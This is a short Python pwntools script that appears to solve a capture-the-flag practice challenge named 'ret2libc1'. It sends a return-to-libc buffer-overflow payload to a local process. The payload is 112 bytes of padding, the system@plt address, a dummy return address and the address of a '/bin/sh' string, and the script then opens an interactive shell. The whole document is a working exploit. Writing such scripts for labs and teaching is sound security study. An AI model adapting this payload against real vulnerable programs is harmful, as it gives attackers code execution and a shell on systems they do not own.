from pwn import *
sh = process('./ret2libc1')

system_plt = 0x08048460
binsh_addr = 0x08048720

payload = flat([b'a' * 112, system_plt, 0xdeadbeef, binsh_addr])
sh.sendline(payload)
sh.interactive()